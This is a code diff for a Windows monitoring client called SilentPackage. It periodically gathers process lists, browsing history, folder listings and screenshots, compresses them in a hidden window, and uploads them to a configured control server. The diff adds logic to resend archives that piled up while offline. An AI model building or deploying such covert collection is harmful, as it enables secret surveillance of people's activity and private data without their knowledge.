@@ -1,4 +1,6 @@
-﻿
+﻿/*
+ * Copyright  Michał Młodawski (SimpleMethod)(c) 2020.
+ */
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -11,6 +13,8 @@ using System.Timers;
 using System.Windows;
 using SilentPackage.Controllers.DocumentGenerator;
 using SilentPackage.Models;
+using System.Management.Automation;
+
 using FileDirectory = SilentPackage.Models.FileDirectory;
 using Process = SilentPackage.Models.Process;
 using Timer = System.Timers.Timer;
@@ -58,7 +62,6 @@ namespace SilentPackage.Controllers
         {
 
             StringBuilder builder = new StringBuilder(" a -t7z \u0022" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\" + filename + ".7z" + "\u0022 -m0=BCJ2 -m1=LZMA2:d=1024m -aoa  \u0022" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\*" + "\u0022");
-
             //7za.exe a -t7z E:\Github\SilentPackage\client\SilentPackage\Files.7z -m0=BCJ2 -m1=LZMA2:d=1024m -aoa C:\Users\Pathfinder\AppData\Local\SP\UserActivityReport
             try
             {
@@ -73,18 +76,22 @@ namespace SilentPackage.Controllers
                         CreateNoWindow = true
                     }
                 };
+
                 process.Start();
-                //string output = process.StandardOutput.ReadToEnd();
+                string output = process.StandardOutput.ReadToEnd();
+
+                //MessageBox.Show(output);
                 process.WaitForExit();
-                // MessageBox.Show(output);
             }
             catch (UnauthorizedAccessException e)
             {
-                Console.WriteLine(e);
+               Console.WriteLine(e);
+          
             }
             catch (Win32Exception e)
             {
                 Console.WriteLine(e);
+    
             }
         }
 
@@ -151,7 +158,7 @@ namespace SilentPackage.Controllers
 
         }
     }
-
+    
 
     /// <summary>
     /// Class to start main timer.
@@ -166,6 +173,7 @@ namespace SilentPackage.Controllers
         private readonly Stack<FileDirectoryList> _fileDirectory = new Stack<FileDirectoryList>();
         private readonly PrintScrFileManagement _fileManagement = new PrintScrFileManagement();
 
+        private int _offline = 0;
         private int _iteration = 0;
         private int _interval = 0;
         private bool _smallState = false;
@@ -193,7 +201,8 @@ namespace SilentPackage.Controllers
 
         private GeneralPurposeTimer()
         {
-            _deviceId = _userIdentification.GetMachineID();
+         //   MessageBox.Show("General purpose Timer");
+           _deviceId = _userIdentification.GetMachineID();
             StartTimer();
 
             if (_configurationManagement.GetConfigModel().PrtScrnEnable)
@@ -265,6 +274,7 @@ namespace SilentPackage.Controllers
         /// <param name="oElapsedEventArgs"></param>
         private void OnTimeEvent(object oSource, ElapsedEventArgs oElapsedEventArgs)
         {
+         //  MessageBox.Show("OnTimer#1");
             DocumentTableGenerator _documentTableGeneration = new DocumentTableGenerator();
             DocumentNavGenerator _documentNavGenerator = new DocumentNavGenerator();
             DocumentGenerator.DocumentGenerator _documentGenerator = new DocumentGenerator.DocumentGenerator();
@@ -272,20 +282,21 @@ namespace SilentPackage.Controllers
             bool historyEnable = false;
             bool fileDirectoryEnable = false;
             bool executeOrder67 = false;
+          
             if (_configurationManagement.GetConfigModel().ListProcessesEnable)
             {
                 ProcessListManagement listManagement = new ProcessListManagement();
                 _processLists.Push(listManagement.GetProcessListReports());
                 processEnable = true;
             }
-
+          //  MessageBox.Show("OnTimer#1AAA");
             if (_configurationManagement.GetConfigModel().WebHistoryEnable)
             {
                 BrowsingHistoryManagement historyManagement = new BrowsingHistoryManagement();
                 _browsingHistory.Push(historyManagement.GetBrowsingHistory());
                 historyEnable = true;
             }
-
+           // MessageBox.Show("OnTimer#BBB");
             if (_configurationManagement.GetConfigModel().FileDirectoryList != null)
             {
                 ScanDirectoryManagement scanDirectoryManagement = new ScanDirectoryManagement();
@@ -293,7 +304,7 @@ namespace SilentPackage.Controllers
                 fileDirectoryEnable = true;
             }
             _iteration++;
-
+          //  MessageBox.Show("OnTimer#2"+ _iteration +"Master"+ _masterInterval);
             if (_smallState)
             {
 
@@ -312,6 +323,7 @@ namespace SilentPackage.Controllers
 
             if (executeOrder67)
             {
+              //  MessageBox.Show("Generowanie raportu#1");
                 long timestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds();
                 string process = null;
                 string history = null;
@@ -343,6 +355,7 @@ namespace SilentPackage.Controllers
 
                 if (_configurationManagement.GetConfigModel().PrtScrnEnable)
                 {
+                    Thread.Sleep(400);
                     if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\screenshots"))
                     {
                         DirectoryInfo di = Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\UserActivityReport\screenshots\");
@@ -360,7 +373,7 @@ namespace SilentPackage.Controllers
                     }
 
                 }
-
+               // MessageBox.Show("Tworzenie raportu #1");
 
                 DataCollection collection = DataCollection.GetInstance();
                 collection.GenerateReports(process, history, directory, screen, _documentGenerator.DocumentIndexGenerator(_documentNavGenerator.GenerateNav(processEnable, historyEnable, _configurationManagement.GetConfigModel().PrtScrnEnable, fileDirectoryEnable, 4)), _documentGenerator.DocumentBootstrapGenerator(), _documentGenerator.DocumentStyleGenerator(), _documentGenerator.DocumentLicenseGenerator());
@@ -374,12 +387,23 @@ namespace SilentPackage.Controllers
                     byte[] data = management.Base64Decode(_configurationManagement.GetConfigModel().License);
                     DecryptDataHandler dataHandler = new DecryptDataHandler(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\data");
                     StringBuilder urlBuilder = new StringBuilder(_configurationManagement.GetConfigModel().AddressCc + "/api/1.0/reports/" + dataHandler.DecryptText(data) + "/" + _deviceId);
-                    Thread.Sleep(200);
-                    // MessageBox.Show(urlBuilder.ToString());
+                    Thread.Sleep(400);
                     string status = client.SendFile(urlBuilder.ToString(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\"+timestamp.ToString() + ".7z", true);
-                    if (status.Equals("200"))
+                    if (status.Equals("OK"))
                     {
+                        if (_offline == 1)
+                        {
+                            string[] _strlist = { ".7z" };
+                            foreach (var e in FileDirectory.ScanDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\SP\", _strlist))
+                            {
+                                client.SendFile(urlBuilder.ToString(), e.FullName, true);
+                            }
+                        }
                         _fileManagement.RemoveReports();
+                    }
+                    else
+                    {
+                        _offline = 1;
                     }
                 }
                 _iteration = 0;
@@ -434,7 +458,7 @@ namespace SilentPackage.Controllers
     }
 
     /// <summary>
-    /// Class for screenshot management.
+    /// Class for screenshots management.
     /// </summary>
     public class PrintScrFileManagement
     {
@@ -629,7 +653,7 @@ namespace SilentPackage.Controllers
         }
 
         /// <summary>
-        /// Taking a screenshot
+        /// Taking a screenshots
         /// </summary>
         public void GetPrintScreen()
         {
@@ -730,7 +754,12 @@ namespace SilentPackage.Controllers
         {
             ProcessList processList = new ProcessList();
             List<Process> processes = new List<Process>();
-            foreach (var f in _windows.GetProcessListPs(true))
+
+            if (_windows.GetProcesses().Count == 0)
+            {
+            }
+
+            foreach (var f in _windows.GetProcesses())
             {
                 processes.Add(new Process(f.GetName(), f.GetId(), f.GetStartTime()));
             }
